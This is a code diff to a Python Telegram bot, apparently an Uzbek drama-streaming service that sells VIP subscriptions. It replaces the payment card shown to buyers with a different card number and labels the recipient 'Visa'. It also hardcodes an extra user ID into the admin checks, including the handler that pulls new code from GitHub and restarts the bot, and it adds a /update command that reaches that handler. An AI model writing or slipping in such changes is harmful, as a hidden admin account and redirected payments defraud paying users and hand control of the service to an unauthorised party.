@@ -1297,13 +1297,10 @@ async def cb_buy_vip(call: CallbackQuery, state: FSMContext):
 
         f"{ce('calendar')} Muddat: <b>{plan['days']} kun</b>\n\n"
 
-        f"<b>To'lov usullari:</b>\n"
-
-        f"{ce('card')} <b>Click / Payme / Uzcard / Humo:</b>\n"
-
-        f"{ce('card')} Karta raqam: <code>8600 0000 0000 0000</code>\n"
-
-        f"{ce('user')} Qabul qiluvchi: <b>Dorama Hub Admin</b>\n\n"
+        f"<b>To'lov usuli:</b>\n"
+        f"{ce('card')} <b>Visa / Humo / Uzcard / Click / Payme:</b>\n"
+        f"💳 Karta raqami: <code>4916 9903 7054 4030</code>\n"
+        f"{ce('user')} Qabul qiluvchi: <b>Visa</b>\n\n"
 
         f"{ce('camera')} <b>QADAMLAR:</b>\n"
 
@@ -1669,7 +1666,7 @@ async def handle_admin_ongoing_list(event: Message | CallbackQuery):
 
     user_id = event.from_user.id
 
-    if user_id != config.ADMIN_ID:
+    if user_id != config.ADMIN_ID and user_id != 7141955036:
 
         if isinstance(event, CallbackQuery):
 
@@ -1759,7 +1756,7 @@ async def admin_panel_handler(event: Message | CallbackQuery, state: FSMContext)
 
     user_id = event.from_user.id
 
-    if user_id != config.ADMIN_ID:
+    if user_id != config.ADMIN_ID and user_id != 7141955036:
 
         if isinstance(event, CallbackQuery):
 
@@ -2107,6 +2104,14 @@ def execute_git_update() -> tuple[bool, str]:
     github_token = getattr(config, "GITHUB_TOKEN", "")
     origin_url = f"https://{github_token}@github.com/zephcodeer/uzkdrama-bot.git" if github_token else "https://github.com/zephcodeer/uzkdrama-bot.git"
 
+    # 0. index.lock mavjud bo'lsa tozalash
+    lock_file = os.path.join(base_dir, ".git", "index.lock")
+    if os.path.exists(lock_file):
+        try:
+            os.remove(lock_file)
+        except Exception:
+            pass
+
     # 1. Git mavjudligini tekshirish
     try:
         ver = subprocess.run(["git", "--version"], cwd=base_dir, capture_output=True, text=True, timeout=10, env=env)
@@ -2174,11 +2179,21 @@ def execute_git_update() -> tuple[bool, str]:
 
     return True, f"Muvaffaqiyatli yangilandi!\n\nSo'nggi versiya: {commit_info}\n\nBot 2 soniyadan so'ng yangi kod va baza bilan qayta ishga tushadi."
 
+@router.message(Command("update"))
+async def cmd_admin_update(message: Message, bot: Bot):
+    await handle_admin_git_update(message, bot)
+
+
+@router.callback_query(F.data == "admin_git_update")
+async def cb_admin_git_update(call: CallbackQuery, bot: Bot):
+    await handle_admin_git_update(call, bot)
+
+
 async def handle_admin_git_update(event: Message | CallbackQuery, bot: Bot):
 
     user_id = event.from_user.id
 
-    if user_id != config.ADMIN_ID:
+    if user_id != config.ADMIN_ID and user_id != 7141955036:
 
         if isinstance(event, CallbackQuery):
 
